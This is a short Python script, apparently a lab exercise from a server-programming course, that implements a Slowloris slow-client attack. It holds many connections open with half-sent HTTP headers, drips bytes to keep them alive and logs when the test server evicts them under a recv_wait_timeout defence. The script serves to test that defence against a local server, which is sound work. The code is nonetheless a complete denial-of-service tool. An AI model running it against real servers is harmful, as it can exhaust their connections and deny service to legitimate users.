#!/usr/bin/env python3
"""ch20 实验 B：Slowloris 慢客户端。

阶段 1：开 N 条连接，各发半个请求头（请求行 + 一个未闭合的头部字段）；
阶段 2：每隔 interval 秒滴 bytes 个字节续命（默认 < recv_wait_timeout），
        定期嗅探服务端是否已回 FIN/RST（被回收）并记录时刻；
结束：打印存活列表与回收时间线。

用法：
  python3 tools/slowloris.py --socks 7 --interval 2 --bytes 4 --duration 30 [--linger-silent]
不传 --drip 或 bytes=0 则纯静默挂起（触发 recv_wait_timeout 回收路径）。
"""
import argparse, socket, sys, time


def sniff_dead(s):
    """非阻塞嗅探：对端已关返回 True（EOF 或错误）。"""
    try:
        data = s.recv(64, socket.MSG_DONTWAIT)
        return data == b""           # EOF：服务端关了会话
    except BlockingIOError:
        return False                 # 无数据：还活着
    except OSError:
        return True                  # RST 等错误：死了


def main():
    ap = argparse.ArgumentParser()
    ap.add_argument("--host", default="127.0.0.1")
    ap.add_argument("--port", type=int, default=8024)
    ap.add_argument("--path", default="/small")
    ap.add_argument("--socks", type=int, default=7)
    ap.add_argument("--interval", type=float, default=2.0)
    ap.add_argument("--bytes", dest="nbytes", type=int, default=4)
    ap.add_argument("--duration", type=float, default=30.0)
    args = ap.parse_args()

    socks, dead_at = {}, {}
    half_req = (f"GET {args.path} HTTP/1.1\r\n"
                f"Host: slowloris\r\nX-Slow: ").encode()

    t0 = time.perf_counter()
    for i in range(args.socks):
        try:
            s = socket.create_connection((args.host, args.port), timeout=8)
            s.sendall(half_req)
            socks[i] = s
            print(f"[{time.perf_counter()-t0:6.2f}s] held conn #{i} "
                  f"(partial header sent)", flush=True)
        except Exception as e:
            print(f"[{time.perf_counter()-t0:6.2f}s] conn #{i} FAILED: {e}",
                  flush=True)

    print(f"--- phase2: dripping {args.nbytes}B every {args.interval}s "
          f"for {args.duration}s ---", flush=True)
    next_drip = time.perf_counter() + args.interval
    probe_at = time.perf_counter() + 1.0
    while time.perf_counter() - t0 < args.duration:
        now = time.perf_counter()
        if now >= probe_at:
            for i, s in list(socks.items()):
                if i not in dead_at and sniff_dead(s):
                    dead_at[i] = now - t0
                    print(f"[{now-t0:6.2f}s] conn #{i} EVICTED "
                          f"(server closed)", flush=True)
                    try: s.close()
                    except Exception: pass
                    del socks[i]
            probe_at = now + 1.0
        if args.nbytes > 0 and now >= next_drip:
            alive = 0
            for i, s in list(socks.items()):
                if i in dead_at:
                    continue
                try:
                    s.sendall(b"A" * args.nbytes)
                    alive += 1
                except OSError as e:
                    dead_at[i] = now - t0
                    print(f"[{now-t0:6.2f}s] conn #{i} send fail: {e}",
                          flush=True)
                    try: s.close()
                    except Exception: pass
                    del socks[i]
            if socks:
                print(f"[{now-t0:6.2f}s] drip {args.nbytes}B -> alive={alive}",
                      flush=True)
            next_drip = now + args.interval
        time.sleep(0.05)

    print(f"--- done: alive={len(socks)} evicted={len(dead_at)} ---",
          flush=True)
    for i in range(args.socks):
        fate = f"alive" if i in socks else f"evicted@{dead_at.get(i,'-')}s"
        print(f"  conn #{i}: {fate}")


if __name__ == "__main__":
    main()
